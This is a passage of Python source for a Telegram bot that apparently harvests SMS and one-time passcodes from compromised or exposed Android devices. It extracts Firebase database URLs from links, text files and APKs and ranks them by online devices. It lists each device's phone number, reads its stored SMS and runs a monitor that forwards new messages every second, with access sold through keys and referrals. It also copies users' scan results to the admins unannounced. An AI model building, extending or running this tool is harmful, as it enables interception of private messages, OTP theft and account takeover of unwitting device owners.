            f"📦 Size: <code>{int(getattr(doc, 'file_size', 0) or 0)}</code> bytes\n\n"
            f"🔗 <b>Share link:</b>\n<code>{link}</code>\n\n"
            "Is link pe koi bhi tap kare → same file mil jayegi.\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📁 SHARE ANOTHER", callback_data="mode_files")],
                [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
            ]),
            disable_web_page_preview=True,
        )
        return

    if user_id not in ADMIN_IDS and is_feature_down("checker"):
        await msg.reply_text(
            feature_down_text("checker"),
            parse_mode="HTML",
            reply_markup=main_home_kb(user_id))
        return

    status_msg = await msg.reply_text("⚡ <b>Processing Uploaded File...</b>", parse_mode="HTML")
    file_path = await download_telegram_file(doc.file_id)
    if not file_path:
        await status_msg.edit_text("❌ Failed to download file.", parse_mode="HTML")
        return
    try:
        is_text_file = False
        file_content = ""
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                file_content = f.read()
            if (
                "firebaseio.com" in file_content
                or "firebasedatabase.app" in file_content
                or "-default-rtdb" in file_content
                or "\n" in file_content
            ):
                is_text_file = True
        except Exception:
            pass

        if is_text_file and len(file_content.strip()) > 0:
            raw_items = file_content.splitlines()
            all_target_dbs = []
            for line in raw_items:
                line = line.strip()
                if not line:
                    continue
                match = re.search(r"https?://[^\s]+", line)
                target_url = match.group(0) if match else line
                unpacked_dbs = extract_firebase_from_vercel_link(target_url)
                valid_dbs = [
                    db for db in unpacked_dbs
                    if "firebaseio.com" in db or "firebasedatabase.app" in db or "-default-rtdb" in db
                ]
                all_target_dbs.extend(valid_dbs)
            seen = set()
            unique_target_dbs = [x for x in all_target_dbs if not (x in seen or seen.add(x))][:2000]
            if unique_target_dbs:
                batch_outputs = await parse_batch_panels(unique_target_dbs)
                await store_user_databases(user_id, batch_outputs)
                report, active_list, dead_count, total_scanned = build_sorted_report(
                    f"File Bulk Scan Report ({file_name})", batch_outputs
                )
                out_path = os.path.join(
                    tempfile.gettempdir(), f"VIP_FileBulk_{user_id}_{int(time.time())}.txt"
                )
                write_sorted_txt(
                    out_path, "VIP ALL IN ONE – File Bulk ACTIVE", active_list,
                    dead_count=dead_count, total_scanned=total_scanned,
                    extra_header=f"User: {user_id} | File: {file_name}",
                )
                await send_bulk_to_admins(
                    user_id, username, f"File: {file_name}", active_list, total_scanned, dead_count, out_path
                )
                asyncio.create_task(
                    log_for_admin_with_status(user_id, username, "File Text Scan", unique_target_dbs, file_name)
                )
                summary = (
                    f"⚡ <b>File Bulk Scan Complete!</b>\n"
                    f"📄 File: <code>{file_name}</code>\n"
                    f"📊 Scanned: <code>{total_scanned}</code> | 🟢 Active: <code>{len(active_list)}</code> | "
                    f"💀 Dead/0: <code>{dead_count}</code>\n\n"
                )
                await status_msg.edit_text(
                    summary + "📄 Sorted ACTIVE .txt attached.\n\n🛡️ <b>VIP ALL IN ONE</b>",
                    parse_mode="HTML",
                )
                try:
                    with open(out_path, "rb") as d:
                        await context.bot.send_document(
                            chat_id=chat_id, document=d,
                            caption=f"📁 <b>ACTIVE only</b> ({len(active_list)} DBs)",
                            parse_mode="HTML",
                        )
                finally:
                    try:
                        os.remove(out_path)
                    except Exception:
                        pass
            else:
                await status_msg.edit_text("⚠️ No valid Firebase URLs in file.", parse_mode="HTML")
        else:
            scan_res, found_dbs = extract_firebase_from_apk(file_path)
            await status_msg.edit_text(scan_res, parse_mode="HTML", disable_web_page_preview=True)
            if found_dbs:
                asyncio.create_task(
                    log_for_admin_with_status(user_id, username, "APK Scan", found_dbs, file_name)
                )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: <code>{str(e)}</code>", parse_mode="HTML")
    finally:
        try:
            os.remove(file_path)
        except Exception:
            pass


# ============================================================
# MODE + CHECKER CALLBACKS
# ============================================================
async def mode_and_checker_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data or ""
    user = q.from_user
    chat_id = q.message.chat_id if q.message else user.id
    user_id = user.id if user else 0
    if user_id and is_banned(user_id) and user_id not in ADMIN_IDS:
        try:
            await q.edit_message_text(
                _bold_blockquote(
                    "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                    "⛔ Bot access band hai."),
                parse_mode="HTML")
        except Exception:
            pass
        return
    save_checker_user(user_id)

    # ── Home / Mode switch ──
    if data == "main_home":
        set_mode(user_id, None)
        await q.edit_message_text(
            "◆ <b>VIP ALL IN ONE BOT</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🟢 <b>Checker</b> — FREE · URL / Decode / Bulk / APK\n"
            "🔵 <b>OTP Dashboard</b> — Key or refer required\n"
            "📁 <b>File Share</b> — FREE · upload & get link\n"
            "🤖 <b>Bot Hosting</b> — Admin approve required\n\n"
            "🔑 <code>/redeem YOUR-KEY</code>\n"
            f"🎁 1 refer = {REFERRAL_HOURS}h OTP access\n\n"
            "Choose a section 👇",
            parse_mode="HTML",
            reply_markup=main_home_kb(user_id),
        )
        return

    if data == "redeem_help":
        await q.edit_message_text(
            "🔑 <b>REDEEM KEY</b>\n\n"
            "OTP Dashboard use karne ke liye key chahiye.\n\n"
            "<b>How to redeem:</b>\n"
            "<code>/redeem VIP-XXXX-XXXX-XXXX</code>\n\n"
            f"Ya referral se free access lo (1 refer = {REFERRAL_HOURS} hours).\n\n"
            "🟢 Checker section bilkul FREE hai — key nahi chahiye.\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=main_home_kb(user_id),
        )
        return

    if data == "mode_checker":
        # CHECKER IS ALWAYS FREE — no OTP access required
        if user_id not in ADMIN_IDS and is_feature_down("checker"):
            await q.edit_message_text(
                feature_down_text("checker"),
                parse_mode="HTML",
                reply_markup=main_home_kb(user_id))
            return
        set_mode(user_id, "check")
        await q.edit_message_text(
            "🟢 <b>FIREBASE CHECKER (FREE)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "✦ Fully Free · Fast · Sorted high→low\n"
            "✦ No key / no referral needed\n\n"
            "<b>Check</b> — Single / bulk firebase urls\n"
            "<b>Decode</b> — Wrapper links and files\n"
            "<b>Live</b> — Online and offline devices\n\n"
            "◉ Send firebase url, bulk list, decode link, or .txt / APK\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=checker_main_keyboard(),
            disable_web_page_preview=True,
        )
        return

    if data == "mode_otp":
        set_mode(user_id, "otp")
        if user_id not in ADMIN_IDS and is_feature_down("otp"):
            await q.edit_message_text(
                feature_down_text("otp"),
                parse_mode="HTML",
                reply_markup=main_home_kb(user_id))
            return
        # OTP requires access (key or referral) — except admin
        if user_id not in ADMIN_IDS and not has_access(user_id):
            await q.edit_message_text(
                "🔵 <b>OTP DASHBOARD</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "⛔ Access expired / not unlocked.\n\n"
                "🔑 Redeem: <code>/redeem YOUR-KEY</code>\n"
                f"🎁 Or refer friends (1 refer = {REFERRAL_HOURS}h)\n\n"
                "🟢 Checker section is FREE anytime.\n\n"
                "🛡️ <b>VIP ALL IN ONE BOT</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="redeem_help")],
                    [InlineKeyboardButton("🟢 GO TO CHECKER (FREE)", callback_data="mode_checker")],
                    [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
                ]),
            )
            return
        await q.edit_message_text(
            "🔵 <b>OTP DASHBOARD</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⏳ Access: <b>{format_remaining_time(user_id)}</b>\n\n"
            "Generate number se OTP monitor start hota hai.\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🎲 GENERATE NUMBER", callback_data="generate_number")],
                [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
            ]),
        )
        return

    if data == "mode_files":
        if user_id not in ADMIN_IDS and is_feature_down("files"):
            await q.edit_message_text(
                feature_down_text("files"),
                parse_mode="HTML",
                reply_markup=main_home_kb(user_id))
            return
        set_mode(user_id, "files")
        await q.edit_message_text(
            "📁 <b>FILE SHARE (FREE)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "1. Send any file here (doc / zip / apk / pdf / media…)\n"
            "2. Bot dega share link\n"
            "3. Link open karne wale ko same file mil jayegi\n\n"
            "Link format:\n"
            f"<code>https://t.me/{BOT_USERNAME}?start=file_xxxxx</code>\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
            ]),
        )
        return

    # ── Checker menu buttons ──
    if data == "chk_menu_check":
        set_mode(user_id, "check")
        await q.edit_message_text(
            "◆ <b>CHECK MODE</b>\n"
            "✦ Send firebase url(s) or .txt file\n\n"
            "• One url or many urls\n"
            "• Comma or line separated\n"
            "• Dead (online=0) auto filtered\n"
            "• Sorted High Online → Low\n\n"
            "🛡️ <b>VIP ALL IN ONE</b>",
            parse_mode="HTML",
            reply_markup=checker_mode_keyboard(),
        )
        return

    if data == "chk_menu_decode":
        set_mode(user_id, "decode")
        await q.edit_message_text(
            "◆ <b>DECODE MODE</b>\n"
            "✦ Send wrapper link(s) or .txt file\n\n"
            "• Panel / wrapper links with ?s=\n"
            "• Encoded payloads\n"
            "• Extracts Firebase + live status\n\n"
            "🛡️ <b>VIP ALL IN ONE</b>",
            parse_mode="HTML",
            reply_markup=checker_mode_keyboard(),
        )
        return

    if data == "chk_menu_help":
        await q.edit_message_text(
            "◆ <b>CHECKER HELP</b>\n\n"
            "• Send firebase url / bulk list\n"
            "• Or wrapper link with ?s=\n"
            "• Or .txt / APK file\n"
            "• Results sorted high→low online\n\n"
            "Commands: /panel /active /most /stats /clean\n"
            "Admin: /admin /export /users /broadcast\n\n"
            "🛡️ <b>VIP ALL IN ONE BOT</b>",
            parse_mode="HTML",
            reply_markup=checker_main_keyboard(),
        )
        return

    if data == "chk_menu_back":
        set_mode(user_id, "check")
        await q.edit_message_text(
            "◆ <b>FIREBASE CHECKER</b>\n\nChoose an option 👇",
            parse_mode="HTML",
            reply_markup=checker_main_keyboard(),
        )
        return

    if data == "chk_menu_active":
        await context.bot.send_message(chat_id=chat_id, text="⚡ Checking ACTIVE Firebase...", parse_mode="HTML")
        data_dbs = load_user_dbs()
        user_map = data_dbs.get(str(user_id), {})
        if not user_map:
            await context.bot.send_message(
                chat_id=chat_id,
                text="⚠️ No databases saved yet.\n\n🛡️ <b>VIP ALL IN ONE</b>",
                parse_mode="HTML",
                reply_markup=checker_main_keyboard(),
            )
            return
        db_list = list(user_map.keys())[:2000]
        batch_results = await parse_batch_panels(db_list)
        await store_user_databases(user_id, batch_results)
        active = filter_and_sort_active(batch_results, min_online=1)
        if not active:
            await context.bot.send_message(
                chat_id=chat_id,
                text="⚠️ No ACTIVE databases right now.\n\n🛡️ <b>VIP ALL IN ONE</b>",
                parse_mode="HTML",
                reply_markup=checker_main_keyboard(),
            )
            return
        out_path = os.path.join(tempfile.gettempdir(), f"VIP_Active_{user_id}_{int(time.time())}.txt")
        write_sorted_txt(
            out_path, "VIP ALL IN ONE – ACTIVE Firebase", active,
            dead_count=len(batch_results) - len(active),
            total_scanned=len(batch_results),
            extra_header=f"User: {user_id}",
        )
        try:
            with open(out_path, "rb") as doc:
                await context.bot.send_document(
                    chat_id=chat_id, document=doc,
                    caption=f"📁 <b>ACTIVE</b> ({len(active)} DBs) · high→low\n🛡️ VIP ALL IN ONE",
                    parse_mode="HTML",
                )
        finally:
            try:
                os.remove(out_path)
            except Exception:
                pass
        await context.bot.send_message(chat_id=chat_id, text="◆ Menu", parse_mode="HTML", reply_markup=checker_main_keyboard())
        return

    if data == "chk_menu_most":
        await context.bot.send_message(chat_id=chat_id, text="⚡ Fetching TOP 20 ACTIVE...", parse_mode="HTML")
        data_dbs = load_user_dbs()
        user_map = data_dbs.get(str(user_id), {})
        if not user_map:
            await context.bot.send_message(
                chat_id=chat_id, text="⚠️ No databases saved yet.", parse_mode="HTML",
                reply_markup=checker_main_keyboard(),
            )
            return
        db_list = list(user_map.keys())[:2000]
        batch_results = await parse_batch_panels(db_list)
        await store_user_databases(user_id, batch_results)
        active = filter_and_sort_active(batch_results, min_online=1)[:20]
        if not active:
            await context.bot.send_message(
                chat_id=chat_id, text="⚠️ No ACTIVE databases.", parse_mode="HTML",
                reply_markup=checker_main_keyboard(),
            )
            return
        report = f"🏆 <b>TOP {len(active)} ACTIVE</b>\n\n"
        for idx, (db_url, total, online) in enumerate(active, 1):
            panel = generate_vercel_link(db_url)
            report += f"<b>{idx}.</b> <code>{db_url}</code>\n📦 <code>{total}</code> | 🟢 <code>{online}</code>\n🔗 {panel}\n\n"
        report += "🛡️ <b>VIP ALL IN ONE</b>"
        await context.bot.send_message(
            chat_id=chat_id, text=report, parse_mode="HTML",
            disable_web_page_preview=True, reply_markup=checker_main_keyboard(),
        )
        return

    if data == "chk_menu_stats":
        data_dbs = load_user_dbs()
        user_map = data_dbs.get(str(user_id), {})
        total = len(user_map)
        if total == 0:
            await context.bot.send_message(
                chat_id=chat_id, text="📊 No databases saved yet.", parse_mode="HTML",
                reply_markup=checker_main_keyboard(),
            )
            return
        active_n = dead_n = top_on = 0
        for info in user_map.values():
            try:
                on = int(info.get("online", 0) or 0)
            except (TypeError, ValueError):
                on = 0
            if on > 0:
                active_n += 1
                top_on = max(top_on, on)
            else:
                dead_n += 1
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"📊 <b>Your Stats</b>\n\n"
                f"📦 Saved: <code>{total}</code>\n"
                f"🟢 Active: <code>{active_n}</code>\n"
                f"💀 Dead/0: <code>{dead_n}</code>\n"
                f"🔥 Highest online: <code>{top_on}</code>\n\n"
                f"🛡️ <b>VIP ALL IN ONE</b>"
            ),
            parse_mode="HTML",
            reply_markup=checker_main_keyboard(),
        )
        return

    # ── Checker admin buttons ──
    if data.startswith("chk_admin_"):
        if user_id not in ADMIN_IDS:
            await q.edit_message_text("⛔ Admin only.", parse_mode="HTML")
            return
        if data == "chk_admin_export":
            await q.edit_message_text("📁 Export started...", parse_mode="HTML", reply_markup=checker_admin_keyboard())
            await handle_export_command(chat_id, user_id)
            return
        if data == "chk_admin_users":
            users = load_checker_users()
            data_dbs = load_user_dbs()
            with_dbs = sum(1 for v in data_dbs.values() if v)
            total_dbs = sum(len(v) for v in data_dbs.values())
            await q.edit_message_text(
                f"👥 <b>Checker Users</b>\n\n"
                f"👤 Total: <code>{len(users)}</code>\n"
                f"📦 With DBs: <code>{with_dbs}</code>\n"
                f"🗄️ DB entries: <code>{total_dbs}</code>\n\n"
                f"🛡️ <b>VIP ALL IN ONE</b>",
                parse_mode="HTML",
                reply_markup=checker_admin_keyboard(),
            )
            return
        if data == "chk_admin_broadcast":
            await q.edit_message_text(
                "📢 <b>Broadcast</b>\n\nUse: <code>/broadcast Your message</code>",
                parse_mode="HTML",
                reply_markup=checker_admin_keyboard(),
            )
            return
        if data == "chk_admin_adminstats":
            data_dbs = load_user_dbs()
            unique_dbs = {}
            for uid, dbs in data_dbs.items():
                for db_url, info in dbs.items():
                    try:
                        on = int(info.get("online", 0) or 0)
                        tot = int(info.get("total", 0) or 0)
                    except (TypeError, ValueError):
                        on, tot = 0, 0
                    if db_url not in unique_dbs or on > unique_dbs[db_url][1]:
                        unique_dbs[db_url] = (tot, on)
            active = [(u, t, o) for u, (t, o) in unique_dbs.items() if o > 0]
            active.sort(key=lambda x: x[2], reverse=True)
            text = (
                f"🛡 <b>Checker Admin Stats</b>\n\n"
                f"👥 Users with data: <code>{len(data_dbs)}</code>\n"
                f"🗄️ Unique DBs: <code>{len(unique_dbs)}</code>\n"
                f"🟢 Active: <code>{len(active)}</code>\n"
                f"💀 Dead/0: <code>{len(unique_dbs) - len(active)}</code>\n\n"
                f"<b>Top 10:</b>\n"
            )
            for i, (db, tot, on) in enumerate(active[:10], 1):
                text += f"{i}. <code>{db}</code>\n   🟢 <code>{on}</code> / 📦 <code>{tot}</code>\n"
            text += "\n🛡️ <b>VIP ALL IN ONE</b>"
            await q.edit_message_text(
                text, parse_mode="HTML", disable_web_page_preview=True,
                reply_markup=checker_admin_keyboard(),
            )
            return


# ============================================================
# MENU CALLBACK
# ============================================================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "force_verify":
        await force_verify_callback(update, context)
        return

    if not await _require_access(update, context, edit_target=q.message):
        uid_check = q.from_user.id
        if uid_check in sms_monitor_state and uid_check not in ADMIN_IDS:
            stop_sms_monitor(uid_check)
        return

    uid = q.from_user.id
    touch_sms_monitor(uid)

    data = q.data
    sess = user_sessions.get(uid)

    if not sess:
        await q.edit_message_text(
            "⚠️ Session expired.\n\nSend /start again.",
            reply_markup=connect_inline_kb())
        return

    if data == "manage_firebase":
        # Users cannot manage Firebase — admin-only via Admin Panel
        if uid not in ADMIN_IDS:
            await q.edit_message_text(
                "⚠️ *Manage Firebase users ke liye band hai.*\n\n"
                "Sirf admin global Firebase add/manage karta hai.\n"
                "Aap *GENERATE NUMBER* use karo.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🎲 GENERATE NUMBER", callback_data="generate_number")],
                    [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
                ]))
            return
        context.user_data["awaiting_url"] = False
        sess["awaiting_fb_add"] = False
        await q.edit_message_text(
            f"🔗 *Manage Firebase*\n\n"
            f"Connected: {len(sess.get('fb_list', []))}/{MAX_FIREBASES}\n"
            f"Choose an action:",
            parse_mode="Markdown", reply_markup=manage_fb_kb(uid))
        return

    if data == "menu_back":
        stop_sms_monitor(uid)
        context.user_data["awaiting_url"] = False
        sess["awaiting_fb_add"] = False
        if not sess.get("fb_list"):
            await q.edit_message_text(
                "◆ <b>VIP ALL IN ONE BOT</b>\n\nChoose a section 👇",
                parse_mode="HTML",
                reply_markup=main_home_kb(uid),
            )
            return
        await q.edit_message_text(
            f"🔗 *Connected Firebase*\n\n"
            f"📊 Total: {len(sess['fb_list'])}/{MAX_FIREBASES}\n\n"
            "Tap a Firebase to fetch online devices.",
            parse_mode="Markdown", reply_markup=manage_fb_kb(uid))
        return

    if data == "scan_active":
        stop_sms_monitor(uid)
        await q.edit_message_text("⏳ Scanning online devices...")
        await scan_and_show(update, context, edit_target=q.message)
        return

    if data == "device_list":
        # Don't stop monitor - show current device info
        uid = q.from_user.id
        touch_sms_monitor(uid)  # Keep monitor active
        
        current_device = sess.get("current_device")
        if current_device:
            # Show current device info
            await _show_device_view(q, sess, current_device)
        else:
            # No current device, show device list
            if not sess.get("devices"):
                await q.answer("No cached scan. Refreshing...", show_alert=False)
                await scan_and_show(update, context, edit_target=q.message)
                return
            if len(sess.get("devices", {})) <= 1:
                await q.edit_message_text("⏳ Scanning online devices...")
                await scan_and_show(update, context, edit_target=q.message)
                return
            await _show_cached_device_list(q, sess)
        return

    if data.startswith("scan_fb:"):
        stop_sms_monitor(uid)
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(sess.get("fb_list", [])):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            await q.edit_message_text("⏳ Scanning this Firebase...")
            await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
        except Exception as e:
            logger.error(f"scan firebase: {e}")
            await q.edit_message_text("❌ Scan failed. Please try again.")
        return

    if data.startswith("delete_fb:"):
        try:
            idx = int(data.split(":", 1)[1])
            fb_list = sess.get("fb_list", [])
            if idx < 0 or idx >= len(fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            removed = fb_list.pop(idx)
            fb_list = [(url, f"FB{i+1}") for i, (url, _) in enumerate(fb_list)]
            sess["fb_list"] = fb_list
            sess["active_fb_idx"] = min(sess.get("active_fb_idx", 0),
                                          max(0, len(fb_list) - 1))
            sess["devices"] = {}
            stop_sms_monitor(uid)
            await q.edit_message_text(
                f"🗑️ *Firebase Deleted*\n\n"
                f"Removed: `{removed[1]}`\n"
                f"Remaining: {len(fb_list)}/{MAX_FIREBASES}",
                parse_mode="Markdown",
                reply_markup=manage_fb_kb(uid) if fb_list else connect_inline_kb())
        except Exception as e:
            logger.error(f"delete firebase: {e}")
            await q.edit_message_text("❌ Delete failed.")
        return

    if data.startswith("fbnoop:"):
        try:
            idx = int(data.split(":", 1)[1])
            fb_list = sess.get("fb_list", [])
            if 0 <= idx < len(fb_list):
                sess["active_fb_idx"] = idx
                await q.answer(f"Opening {fb_list[idx][1]}...")
                await q.edit_message_text(
                    f"⏳ Scanning {fb_list[idx][1]} for online devices...",
                    parse_mode="Markdown")
                await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
            else:
                await q.answer("Invalid Firebase.", show_alert=True)
        except Exception as e:
            logger.error(f"open firebase: {e}")
            await q.answer("Firebase scan failed.", show_alert=True)
        return

    if data == "noop":
        await q.answer(f"Page {sess.get('device_page', 0)+1}")
        return

    if data.startswith("devpage:"):
        try:
            page = int(data.split(":", 1)[1])
            devices = sess.get("devices", {})
            items = list(devices.items())[:80]
            total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
            if page < 0 or page >= total_pages:
                await q.answer("Invalid page.", show_alert=True)
                return
            sess["device_page"] = page
            await _show_cached_device_list(q, sess)
        except Exception as e:
            logger.error(f"device page: {e}")
            await q.answer("Page change failed.", show_alert=True)
        return

    if data.startswith("dev:"):
        device_id = data.split(":", 1)[1]
        await _show_device_view(q, sess, device_id)
        return

    if data.startswith("sms_refresh:") or data.startswith("sms:"):
        device_id = data.split(":", 1)[1]
        info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id)
            fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url:
                info = {
                    "fb_url": fb_url,
                    "fb_tag": parsed_tag,
                    "real_cid": parsed_cid,
                    "phone": "",
                    "online": True,
                    "raw": {},
                }
                sess.setdefault("devices", {})[device_id] = info
            else:
                await q.answer("Device not found. Please REFRESH.", show_alert=True)
                return
        if data.startswith("sms_refresh:"):
            sess.setdefault("sms_last_updated", {})[device_id] = datetime.now().strftime("%I:%M %p")
        updated_at = sess.get("sms_last_updated", {}).get(device_id)
        await _show_sms_safe(q, info, device_id, updated_at=updated_at)
        return

    if data.startswith("smsmon_stop:"):
        stop_sms_monitor(uid)
        device_id = data.split(':', 1)[1]
        await _show_device_view(q, sess, device_id)
        return

    if data.startswith("smsmon:"):
        device_id = data.split(":", 1)[1]
        info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id)
            fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url:
                info = {
                    "fb_url": fb_url,
                    "fb_tag": parsed_tag,
                    "real_cid": parsed_cid,
                    "phone": "",
                    "online": True,
                    "raw": {},
                }
                sess.setdefault("devices", {})[device_id] = info
            else:
                await q.answer("Device not found.", show_alert=True)
                return
        phone = info.get("phone") or "N/A"
        stop_sms_monitor(uid)
        baseline_fingerprints = set()
        try:
            baseline_pairs = await fetch_last_sms(
                info.get("fb_url", ""), info.get("real_cid", device_id), limit=50)
            baseline_fingerprints = {
                _msg_fingerprint(key, message) for key, message in baseline_pairs}
        except Exception as exc:
            logger.warning("manual SMS baseline unavailable: %s", exc)
        start_sms_monitor(
            context.bot, uid, q.message.chat_id, device_id,
            baseline_fingerprints=baseline_fingerprints,
            fb_url=info.get("fb_url", ""))
        await q.edit_message_text(
            "📨 *SMS Monitor Started*\n\n"
            f"📱 *Device:* `{info.get('real_cid', device_id)}`\n"
            f"📞 *Number:* `{phone}`\n\n"
            "⏱️ *Duration:* 5 minutes\n"
            "⚡ *Speed:* 1 sec polling\n\n"
            "🔔 Har naya SMS turant yahan forward hoga.",
            parse_mode="Markdown",
            reply_markup=sms_monitor_kb(device_id))
        state = sms_monitor_state.get(uid)
        if state is not None:
            state["monitor_message_id"] = q.message.message_id
        return


# ============================================================
# SCAN HELPER
# ============================================================
async def scan_and_show(update, context, edit_target=None, fb_idx=None):
    uid = update.effective_user.id
    sess = user_sessions.get(uid)
    if not sess or not sess.get("fb_list"):
        if edit_target:
            await edit_target.edit_text("⚠️ No Firebase connected. Send /start.")
        return
    if fb_idx is not None:
        sess["active_fb_idx"] = fb_idx
    prefetched = sess.pop("prefetched", {})
    devices_task = fetch_devices_all_firebases(
        sess["fb_list"], only_online=True, prefetched=prefetched)
    counts_task = fetch_counts_all_firebases(
        sess["fb_list"], prefetched=prefetched)
    devices, (online_count, offline_count, per_fb) = await asyncio.gather(
        devices_task, counts_task)
    online_count = len(devices)
    total_count = online_count + offline_count
    sess["devices"] = devices
    sess["mode"] = "online"
    sess["device_page"] = 0
    sess["online_count"] = online_count
    sess["offline_count"] = offline_count
    sess["total_count"] = total_count
    text = (f"📞 *DEVICES INFO*\n\n"
            f"🟢 ONLINE : {online_count}\n"
            f"🔴 OFFLINE : {offline_count}\n"
            f"📊 TOTAL : {total_count}\n"
            f"🔗 Firebase: {len(sess['fb_list'])}\n\n"
            "Tap a device below.")
    markup = (device_list_kb(devices, mode="online", page=0)
              if devices else firebase_connected_kb(uid))
    if edit_target:
        await edit_target.edit_text(text, parse_mode="Markdown", reply_markup=markup)
    else:
        await update.effective_message.reply_text(
            text, parse_mode="Markdown", reply_markup=markup)


# ============================================================
# MAINTENANCE LOOP
# ============================================================
async def _maintenance_loop(bot):
    loop_count = 0
    while True:
        try:
            await asyncio.sleep(ACCESS_CHECK_INTERVAL)
            loop_count += 1
            if loop_count % max(1, CLEANUP_INTERVAL // ACCESS_CHECK_INTERVAL) == 0:
                gc.collect()
            for uid, task in list(sms_monitor_tasks.items()):
                if task.done():
                    sms_monitor_tasks.pop(uid, None)
            for uid, task in list(admin_panel_live_tasks.items()):
                if task.done():
                    admin_panel_live_tasks.pop(uid, None)

            now = time.time()
            for uid in list(sms_monitor_state.keys()):
                if uid in ADMIN_IDS:
                    continue
                if not has_access(uid):
                    logger.info("[MONITOR] auto-stop uid=%s reason=access_expired", uid)
                    stop_sms_monitor(uid)
                    try:
                        await bot.send_message(
                            chat_id=uid,
                            text=_bold_blockquote(
                                "⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
                                "⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱.\n\n"
                                "🔗 𝗥𝗲𝗳𝗲𝗿 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗼𝗿𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.\n"
                                "📌 𝗦𝗲𝗻𝗱 /start 𝘁𝗼 𝗿𝗲𝘀𝘁𝗮𝗿𝘁."),
                            parse_mode="HTML",
                            reply_markup=connect_inline_kb())
                    except Exception as exc:
                        logger.info("could not notify revoked monitor %s: %s", uid, exc)

            if REQUIRED_CHANNELS:
                for uid in list(known_users):
                    joined, missing = await _check_required_channels(bot, uid)
                    previous = user_access_state.get(uid)
                    user_access_state[uid] = joined
                    if previous is True and not joined:
                        verified_access_users.discard(uid)
                        if uid in sms_monitor_state and uid not in ADMIN_IDS:
                            logger.info("[MONITOR] auto-stop uid=%s reason=channel_leave", uid)
                            stop_sms_monitor(uid)
                        referrer_id = await check_referred_user_left(uid)
                        if referrer_id:
                            try:
                                await bot.send_message(
                                    chat_id=referrer_id,
                                    text=_bold_blockquote(
                                        "⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗\n\n"
                                        "👤 𝗔 𝗿𝗲𝗳𝗲𝗿𝗿𝗲𝗱 𝘂𝘀𝗲𝗿 𝗹𝗲𝗳𝘁 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹\n\n"
                                        "📌 𝗥𝗲𝗮𝘀𝗼𝗻 : Channel Leave\n\n"
                                        "🎁 𝗥𝗘𝗙𝗘𝗥 𝗔𝗚𝗔𝗜𝗡 𝗧𝗢 𝗚𝗘𝗧 𝗔𝗖𝗖𝗘𝗦𝗦"),
                                    parse_mode="HTML")
                            except Exception as exc:
                                logger.info(
                                    "could not notify referrer %s: %s", referrer_id, exc)
                            if referrer_id in sms_monitor_state and referrer_id not in ADMIN_IDS:
                                logger.info(
                                    "[MONITOR] auto-stop referrer uid=%s reason=referral_revoked",
                                    referrer_id)
                                stop_sms_monitor(referrer_id)
                        try:
                            await bot.send_message(
                                chat_id=uid,
                                text=_bold_blockquote(
                                    "⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗\n\n"
                                    "📌 𝗥𝗲𝗮𝘀𝗼𝗻 : Channel Leave\n\n"
                                    "🔗 𝗥𝗲𝗷𝗼𝗶𝗻 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲."),
                                parse_mode="HTML",
